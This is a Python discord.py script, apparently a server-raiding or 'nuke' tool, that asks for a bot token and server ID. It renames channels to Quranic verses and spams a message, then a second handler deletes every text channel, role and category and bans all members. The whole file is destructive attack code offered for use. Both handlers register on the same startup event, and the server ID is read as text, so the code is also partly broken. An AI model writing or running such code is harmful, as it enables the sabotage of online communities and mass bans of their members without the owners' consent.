import discord
from discord.ext import commands

TOKEN = input("bot Token:")
GUILD_ID = input("server id:")

new_channel_names = [
    "1 بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ",
    "2 الْحَمْدُ لِلَّهِ رَبِّ الْعَالَمِينَ",
    "3 الرَّحْمَنِ الرَّحِيمِ",
    "4 مَالِكِ يَوْمِ الدِّينِ",
    "5 إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ"
]

message_to_send = (
    "1 بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ "
    "الْحَمْدُ لِلَّهِ رَبِّ الْعَالَمِينَ "
    "3 الرَّحْمَنِ الرَّحِيمِ "
    "4 مَالِكِ يَوْمِ الدِّينِ "
    "إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ "
    "اهْدِنَا الصِّرَاطَ الْمُسْتَقِيمَ "
    "صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ "
    "غيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ"
)

# Using old intents (default)
intents = discord.Intents.default()

bot = commands.Bot(command_prefix=".", intents=intents)


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    guild = bot.get_guild(GUILD_ID)

    if guild is None:
        print(f"Guild with ID {GUILD_ID} not found!")
        return

    for i, channel in enumerate(guild.text_channels):
        try:
            if i < len(new_channel_names):
                new_name = new_channel_names[i]
                await channel.edit(name=new_name)
                print(f"Renamed {channel.name} to {new_name}")

                await channel.send(message_to_send)
                print(f"Message sent to {new_name}")
            else:
                break
        except Exception as e:
            print(f"Error renaming/sending message: {e}")


@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    guild = bot.get_guild(GUILD_ID)

    if guild is None:
        print(f"❌ Guild with ID {GUILD_ID} not found!")
        return

    print("🗑 Deleting all text channels...")
    
    for channel in guild.text_channels:
        try:
            await channel.delete()
            print(f"✅ Deleted channel: {channel.name}")
        except Exception as e:
            print(f"⚠ Error deleting {channel.name}: {e}")

    print("✅ All text channels have been deleted!")

    for roles in guild.roles:
        try:
            await roles.delete()
            print(f"✅ Deleted role: {roles.name}")
        except Exception as e:
            print(f"⚠ Error deleting {roles.name}: {e}")

    print("✅ All Roles have been deleted!")

    for categ in guild.categories:
        try:
            await categ.delete()
            print(f"✅ Deleted categorie: {categ.name}")
        except Exception as e:
            print(f"⚠ Error deleting {categ.name}: {e}")

    print("✅ All Categories have been deleted!")

    for user in guild.members:
        try:
            await user.ban()
            print(f"✅ Banned: {user.name}")
        except Exception as e:
            print(f"⚠ Error banning {user.name}: {e}")

    print("✅ All users have been banned!")

bot.run(TOKEN)

